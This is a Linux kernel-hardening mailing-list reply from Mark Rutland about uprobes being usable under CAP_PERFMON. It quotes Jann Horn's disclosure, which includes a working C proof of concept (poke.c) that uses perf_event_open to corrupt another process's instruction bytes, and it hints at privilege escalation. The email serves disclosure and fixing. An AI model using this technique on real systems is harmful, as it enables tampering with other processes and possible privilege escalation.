Return-Path: <kernel-hardening-return-21954-kernel-hardening=archiver.kernel.org@lists.openwall.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from second.openwall.net (second.openwall.net [193.110.157.125])
	by smtp.lore.kernel.org (Postfix) with SMTP id 0A511C8303F
	for <kernel-hardening@archiver.kernel.org>; Wed,  2 Jul 2025 11:13:46 +0000 (UTC)
Received: (qmail 32108 invoked by uid 550); 2 Jul 2025 11:13:34 -0000
Mailing-List: contact kernel-hardening-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:kernel-hardening@lists.openwall.com>
List-Help: <mailto:kernel-hardening-help@lists.openwall.com>
List-Unsubscribe: <mailto:kernel-hardening-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:kernel-hardening-subscribe@lists.openwall.com>
List-ID: <kernel-hardening.lists.openwall.com>
Received: (qmail 32067 invoked from network); 2 Jul 2025 11:13:34 -0000
Date: Wed, 2 Jul 2025 12:13:17 +0100
From: Mark Rutland <mark.rutland@arm.com>
To: Jann Horn <jannh@google.com>
Cc: Serge Hallyn <serge@hallyn.com>,
	linux-security-module <linux-security-module@vger.kernel.org>,
	Peter Zijlstra <peterz@infradead.org>,
	Ingo Molnar <mingo@redhat.com>,
	Arnaldo Carvalho de Melo <acme@kernel.org>,
	Namhyung Kim <namhyung@kernel.org>,
	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
	Adrian Hunter <adrian.hunter@intel.com>,
	"Liang, Kan" <kan.liang@linux.intel.com>,
	linux-perf-users@vger.kernel.org,
	Kernel Hardening <kernel-hardening@lists.openwall.com>,
	linux-hardening@vger.kernel.org,
	kernel list <linux-kernel@vger.kernel.org>,
	Alexey Budankov <alexey.budankov@linux.intel.com>,
	James Morris <jamorris@linux.microsoft.com>
Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>

On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
> Since commit c9e0924e5c2b ("perf/core: open access to probes for
> CAP_PERFMON privileged process"), it is possible to create uprobes
> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
> have destructive effects, while my understanding is that CAP_PERFMON
> is supposed to only let you _read_ stuff (like registers and stack
> memory) from other processes, but not modify their execution.

I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
leave that discussion to others. I agree it seems undesirable to permit
destructive effects.

> uprobes (at least on x86) can be destructive because they have no
> protection against poking in the middle of an instruction; basically
> as long as the kernel manages to decode the instruction bytes at the
> caller-specified offset as a relocatable instruction, a breakpoint
> instruction can be installed at that offset.

FWIW, similar issues would apply to other architectures (even those like
arm64 where instuctions are fixed-size and naturally aligned), as a
uprobe could be placed on a literal pool in a text section, corrupting
data.

It looks like c9e0924e5c2b reverts cleanly, so that's an option.

Mark.

> This means uprobes can be used to alter what happens in another
> process. It would probably be a good idea to go back to requiring
> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
> where the kernel can prove that the software breakpoint poke cannot
> break the target process. (Which seems harder than doing it for
> kprobe, since kprobe can at least rely on symbols to figure out where
> a function starts...)
> 
> As a small example, in one terminal:
> ```
> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
> #include <unistd.h>
> #include <stdio.h>
> 
> __attribute__((noinline))
> void bar(unsigned long value) {
>   printf("bar(0x%lx)\n", value);
> }
> 
> __attribute__((noinline))
> void foo(unsigned long value) {
>   value += 0x90909090;
>   bar(value);
> }
> 
> void (*foo_ptr)(unsigned long value) = foo;
> 
> int main(void) {
>   while (1) {
>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
> *)(void*)foo)[1]);
>     foo_ptr(0);
>     sleep(1);
>   }
> }
> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
> [...]
> 00000000000011b0 <foo>:
>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
>     11b5:       48 01 c7                add    %rax,%rdi
>     11b8:       eb d6                   jmp    1190 <bar>
> [...]
> jannh@horn:~/test/perfmon-uprobepoke$ ./target
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> ```
> 
> and in another terminal:
> ```
> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <unistd.h>
> #include <err.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <linux/perf_event.h>
> 
> int main(void) {
>   int uprobe_type;
>   FILE *uprobe_type_file =
> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
>   if (uprobe_type_file == NULL)
>     err(1, "fopen uprobe type");
>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
>     errx(1, "read uprobe type");
>   fclose(uprobe_type_file);
>   printf("uprobe type is %d\n", uprobe_type);
> 
>   unsigned long target_off;
>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
>   if (!pof)
>     err(1, "popen nm");
>   if (fscanf(pof, "%lx", &target_off) != 1)
>     errx(1, "read target offset");
>   pclose(pof);
>   target_off += 1;
>   printf("will poke at 0x%lx\n", target_off);
> 
>   struct perf_event_attr attr = {
>     .type = uprobe_type,
>     .size = sizeof(struct perf_event_attr),
>     .sample_period = 100000,
>     .sample_type = PERF_SAMPLE_IP,
>     .uprobe_path = (unsigned long)"target",
>     .probe_offset = target_off
>   };
>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
>   if (perf_fd == -1)
>     err(1, "perf_event_open");
>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
>   if (map == MAP_FAILED)
>     err(1, "mmap error");
>   printf("mmap success\n");
>   while (1) pause();
> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
> uprobe type is 9
> will poke at 0x11b1
> mmap success
> ```
> 
> This results in the first terminal changing output as follows, showing
> that 0xcc was written into the middle of the "mov" instruction,
> modifying its immediate operand:
> ```
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0x90
> bar(0x90909090)
> byte 1 of foo(): 0xcc
> bar(0x909090cc)
> byte 1 of foo(): 0xcc
> bar(0x909090cc)
> ```
> 
> It's probably possible to turn this into a privilege escalation by
> doing things like clobbering part of the distance of a jump or call
> instruction.
